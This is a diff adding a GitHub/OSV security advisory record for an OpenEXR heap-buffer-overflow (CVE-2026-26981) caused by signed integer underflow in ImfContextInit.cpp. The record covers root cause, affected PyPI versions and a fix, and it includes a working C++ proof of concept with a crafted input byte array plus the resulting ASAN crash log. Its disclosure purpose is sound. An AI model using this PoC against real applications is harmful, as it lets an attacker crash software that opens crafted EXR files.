@@ -1,0 +1,96 @@
+{
+  "id": "GHSA-q6vj-wxvf-5m8c",
+  "modified": "2026-04-06T18:02:28.066180Z",
+  "published": "2026-04-06T17:51:37Z",
+  "aliases": [
+    "CVE-2026-26981"
+  ],
+  "summary": "OpenEXR has heap-buffer-overflow via signed integer underflow in ImfContextInit.cpp",
+  "details": "## Summary\n\nA heap-buffer-overflow (OOB read) occurs in the `istream_nonparallel_read` function in `ImfContextInit.cpp` when parsing a malformed EXR file through a memory-mapped `IStream`. A signed integer subtraction produces a negative value that is implicitly converted to `size_t`, resulting in a massive length being passed to `memcpy`.\n\n## Affected Version\n\n- OpenEXR **main branch** (commit at time of testing)\n- `src/lib/OpenEXR/ImfContextInit.cpp`, lines 121–136\n\n## Root Cause\n\n`ImfContextInit.cpp:121-126`:\n\n```cpp\nint64_t stream_sz = s-\u003esize ();           // e.g., 21 (actual file size)\nint64_t nend = nread + (int64_t)sz;       // e.g., 17 + 4096 = 4113\nif (stream_sz \u003e 0 \u0026\u0026 nend \u003e stream_sz)\n{\n    sz = stream_sz - nend;                // 21 - 4113 = -4092 (signed)\n}\n// ...\nmemcpy (buffer, data, sz);               // sz is size_t → wraps to 0xFFFFFFFFFFFFF004\n```\n\n`sz` is of type `size_t` (unsigned), but `stream_sz - nend` yields a negative `int64_t` value. This negative value is implicitly converted to `size_t`, wrapping around to a value close to `2^64`, which is then passed to `memcpy` causing a heap-buffer-overflow.\n\n**Suggested fix:** `sz = stream_sz - nend` → `sz = stream_sz - nread`\n\n## Reproduce\n\nBuild OpenEXR as static libraries with ASAN enabled, then compile the PoC below.\n\n**PoC Code:**\n\n```cpp\n#include \u003ccstdint\u003e\n#include \u003ccstring\u003e\n#include \u003ciostream\u003e\n\n#include \u003cImfMultiPartInputFile.h\u003e\n#include \u003cImfInputPart.h\u003e\n#include \u003cImfHeader.h\u003e\n\nOPENEXR_IMF_INTERNAL_NAMESPACE_HEADER_ENTER\n\nclass MemMapIStream : public IStream\n{\npublic:\n    MemMapIStream (const uint8_t* data, size_t len)\n        : IStream (\"poc_input\")\n        , _data (reinterpret_cast\u003cconst char*\u003e (data))\n        , _size (static_cast\u003cint64_t\u003e (len))\n        , _pos (0)\n    {}\n\n    bool isMemoryMapped () const override { return true; }\n\n    bool read (char c[], int n) override\n    {\n        int64_t avail = (_pos \u003c _size) ? (_size - _pos) : 0;\n        int64_t copy  = (static_cast\u003cint64_t\u003e (n) \u003c avail) ? n : avail;\n        if (copy \u003e 0) memcpy (c, _data + _pos, copy);\n        _pos += n;\n        return _pos \u003c= _size;\n    }\n\n    char* readMemoryMapped (int n) override\n    {\n        if (_pos + n \u003e _size)\n            throw IEX_NAMESPACE::InputExc (\"read past end\");\n        const char* p = _data + _pos;\n        _pos += n;\n        return const_cast\u003cchar*\u003e (p);\n    }\n\n    uint64_t tellg () override { return static_cast\u003cuint64_t\u003e (_pos); }\n    void     seekg (uint64_t pos) override { _pos = static_cast\u003cint64_t\u003e (pos); }\n\n    int64_t size () override { return _size; }\n\nprivate:\n    const char* _data;\n    int64_t     _size;\n    int64_t     _pos;\n};\n\nOPENEXR_IMF_INTERNAL_NAMESPACE_HEADER_EXIT\n\nint main ()\n{\n    static const uint8_t crash_data[] = {\n        0x76, 0x2f, 0x31, 0x01,\n        0x02, 0x06, 0x00, 0x00,\n        0x74, 0x69, 0x6c, 0x65, 0x73, 0x00,\n        0x20, 0x00, 0x00,\n        0x53, 0x00, 0x00, 0x00\n    };\n\n    try\n    {\n        Imf::MemMapIStream stream (crash_data, sizeof (crash_data));\n        Imf::MultiPartInputFile file (stream);\n    }\n    catch (const std::exception\u0026 e)\n    {\n        std::cout \u003c\u003c \"Exception: \" \u003c\u003c e.what () \u003c\u003c \"\\n\";\n    }\n\n    return 0;\n}\n```\n\n**PoC Input:** https://drive.google.com/file/d/1VhjdK11LA0LHdW1mJJIQEo64mc5tpOUV/view?usp=drive_link\n\n## ASAN Log\n\n```\n==305348==ERROR: AddressSanitizer: negative-size-param: (size=-4096)\n    #0 0x62aee9fc732a in __asan_memcpy (/home/wjddn0623/fuzzing/openexr/exr_decode_fuzzer+0x23932a) (BuildId: c02729e73015cfda2879d44b5d5b25d4b5e68ae0)\n    #1 0x62aeea0e3377 in Imf_4_0::istream_nonparallel_read(_priv_exr_context_t const*, void*, void*, unsigned long, unsigned long, int (*)(_priv_exr_context_t const*, int, char const*, ...)) /home/wjddn0623/fuzzing/openexr/src/lib/OpenEXR/ImfContextInit.cpp:136:21\n    #2 0x62aeea15e75b in dispatch_read /home/wjddn0623/fuzzing/openexr/src/lib/OpenEXRCore/context.c:51:16\n    #3 0x62aeea19da19 in scratch_seq_skip /home/wjddn0623/fuzzing/openexr/src/lib/OpenEXRCore/parse_header.c:202:29\n    #4 0x62aeea197ec9 in check_populate_tiles /home/wjddn0623/fuzzing/openexr/src/lib/OpenEXRCore/parse_header.c:1560:9\n    #5 0x62aeea197ec9 in check_req_attr /home/wjddn0623/fuzzing/openexr/src/lib/OpenEXRCore/parse_header.c:2020:24\n    #6 0x62aeea197ec9 in pull_attr /home/wjddn0623/fuzzing/openexr/src/lib/OpenEXRCore/parse_header.c:2085:10\n    #7 0x62aeea197ec9 in internal_exr_parse_header /home/wjddn0623/fuzzing/openexr/src/lib/OpenEXRCore/parse_header.c:2848:18\n    #8 0x62aeea15f578 in exr_start_read /home/wjddn0623/fuzzing/openexr/src/lib/OpenEXRCore/context.c:270:49\n    #9 0x62aeea0d8130 in Imf_4_0::Context::Context(char const*, Imf_4_0::ContextInitializer const\u0026, Imf_4_0::Context::read_mode_t) /home/wjddn0623/fuzzing/openexr/src/lib/OpenEXR/ImfContext.cpp:124:10\n    #10 0x62aeea0633ab in Imf_4_0::MultiPartInputFile::MultiPartInputFile(char const*, Imf_4_0::ContextInitializer const\u0026, int, bool) /home/wjddn0623/fuzzing/openexr/src/lib/OpenEXR/ImfMultiPartInputFile.cpp:59:7\n    #11 0x62aeea0649de in Imf_4_0::MultiPartInputFile::MultiPartInputFile(Imf_4_0::IStream\u0026, int, bool) /home/wjddn0623/fuzzing/openexr/src/lib/OpenEXR/ImfMultiPartInputFile.cpp:96:7\n    #12 0x62aeea00d522 in fuzz_cpp_headers(char const*, unsigned long) /home/wjddn0623/fuzzing/openexr/exr_decode_fuzzer.cc:167:31\n    #13 0x62aeea00d522 in fuzz_cpp_api(char const*, unsigned long) /home/wjddn0623/fuzzing/openexr/exr_decode_fuzzer.cc:460:5\n    #14 0x62aeea00a156 in LLVMFuzzerTestOneInput /home/wjddn0623/fuzzing/openexr/exr_decode_fuzzer.cc:927:5\n    #15 0x62aee9f15414 in fuzzer::Fuzzer::ExecuteCallback(unsigned char const*, unsigned long) (/home/wjddn0623/fuzzing/openexr/exr_decode_fuzzer+0x187414) (BuildId: c02729e73015cfda2879d44b5d5b25d4b5e68ae0)\n    #16 0x62aee9efe546 in fuzzer::RunOneTest(fuzzer::Fuzzer*, char const*, unsigned long) (/home/wjddn0623/fuzzing/openexr/exr_decode_fuzzer+0x170546) (BuildId: c02729e73015cfda2879d44b5d5b25d4b5e68ae0)\n    #17 0x62aee9f03ffa in fuzzer::FuzzerDriver(int*, char***, int (*)(unsigned char const*, unsigned long)) (/home/wjddn0623/fuzzing/openexr/exr_decode_fuzzer+0x175ffa) (BuildId: c02729e73015cfda2879d44b5d5b25d4b5e68ae0)\n    #18 0x62aee9f2e7b6 in main (/home/wjddn0623/fuzzing/openexr/exr_decode_fuzzer+0x1a07b6) (BuildId: c02729e73015cfda2879d44b5d5b25d4b5e68ae0)\n    #19 0x71035ee2a1c9 in __libc_start_call_main csu/../sysdeps/nptl/libc_start_call_main.h:58:16\n    #20 0x71035ee2a28a in __libc_start_main csu/../csu/libc-start.c:360:3\n    #21 0x62aee9ef9114 in _start (/home/wjddn0623/fuzzing/openexr/exr_decode_fuzzer+0x16b114) (BuildId: c02729e73015cfda2879d44b5d5b25d4b5e68ae0)\n\n0x503000000235 is located 0 bytes after 21-byte region [0x503000000220,0x503000000235)\nallocated by thread T0 here:\n    #0 0x62aeea007c61 in operator new[](unsigned long) (/home/wjddn0623/fuzzing/openexr/exr_decode_fuzzer+0x279c61) (BuildId: c02729e73015cfda2879d44b5d5b25d4b5e68ae0)\n    #1 0x62aee9f15325 in fuzzer::Fuzzer::ExecuteCallback(unsigned char const*, unsigned long) (/home/wjddn0623/fuzzing/openexr/exr_decode_fuzzer+0x187325) (BuildId: c02729e73015cfda2879d44b5d5b25d4b5e68ae0)\n    #2 0x62aee9efe546 in fuzzer::RunOneTest(fuzzer::Fuzzer*, char const*, unsigned long) (/home/wjddn0623/fuzzing/openexr/exr_decode_fuzzer+0x170546) (BuildId: c02729e73015cfda2879d44b5d5b25d4b5e68ae0)\n    #3 0x62aee9f03ffa in fuzzer::FuzzerDriver(int*, char***, int (*)(unsigned char const*, unsigned long)) (/home/wjddn0623/fuzzing/openexr/exr_decode_fuzzer+0x175ffa) (BuildId: c02729e73015cfda2879d44b5d5b25d4b5e68ae0)\n    #4 0x62aee9f2e7b6 in main (/home/wjddn0623/fuzzing/openexr/exr_decode_fuzzer+0x1a07b6) (BuildId: c02729e73015cfda2879d44b5d5b25d4b5e68ae0)\n    #5 0x71035ee2a1c9 in __libc_start_call_main csu/../sysdeps/nptl/libc_start_call_main.h:58:16\n    #6 0x71035ee2a28a in __libc_start_main csu/../csu/libc-start.c:360:3\n    #7 0x62aee9ef9114 in _start (/home/wjddn0623/fuzzing/openexr/exr_decode_fuzzer+0x16b114) (BuildId: c02729e73015cfda2879d44b5d5b25d4b5e68ae0)\n\nSUMMARY: AddressSanitizer: negative-size-param (/home/wjddn0623/fuzzing/openexr/exr_decode_fuzzer+0x23932a) (BuildId: c02729e73015cfda2879d44b5d5b25d4b5e68ae0) in __asan_memcpy\n==305348==ABORTING\n```\n\n## Impact\n\n- **DoS** — Any application that opens a crafted EXR file will crash immediately\n- **CWE-195** (Signed to Unsigned Conversion Error) → **CWE-122** (Heap-based Buffer Overflow)\n- Affects any application using an `IStream` implementation where `isMemoryMapped()` returns `true`",
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "PyPI",
+        "name": "openexr",
+        "purl": "pkg:pypi/openexr"
+      },
+      "ranges": [
+        {
+          "type": "ECOSYSTEM",
+          "events": [
+            {
+              "introduced": "3.3.0"
+            },
+            {
+              "fixed": "3.3.7"
+            }
+          ]
+        }
+      ],
+      "versions": [
+        "3.3.0",
+        "3.3.1",
+        "3.3.2",
+        "3.3.3",
+        "3.3.4",
+        "3.3.5",
+        "3.3.6"
+      ],
+      "database_specific": {
+        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/04/GHSA-q6vj-wxvf-5m8c/GHSA-q6vj-wxvf-5m8c.json"
+      }
+    },
+    {
+      "package": {
+        "ecosystem": "PyPI",
+        "name": "openexr",
+        "purl": "pkg:pypi/openexr"
+      },
+      "ranges": [
+        {
+          "type": "ECOSYSTEM",
+          "events": [
+            {
+              "introduced": "3.4.0"
+            },
+            {
+              "fixed": "3.4.5"
+            }
+          ]
+        }
+      ],
+      "versions": [
+        "3.4.0",
+        "3.4.1",
+        "3.4.2",
+        "3.4.3",
+        "3.4.4"
+      ],
+      "database_specific": {
+        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/04/GHSA-q6vj-wxvf-5m8c/GHSA-q6vj-wxvf-5m8c.json"
+      }
+    }
+  ],
+  "references": [
+    {
+      "type": "WEB",
+      "url": "https://github.com/AcademySoftwareFoundation/openexr/security/advisories/GHSA-q6vj-wxvf-5m8c"
+    },
+    {
+      "type": "ADVISORY",
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-26981"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/AcademySoftwareFoundation/openexr/commit/6bb2ddf1068573d073edf81270a015b38cc05cef"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/AcademySoftwareFoundation/openexr/commit/d2be382758adc3e9ab83a3de35138ec28d93ebd8"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://github.com/AcademySoftwareFoundation/openexr"
+    }
+  ]
+}
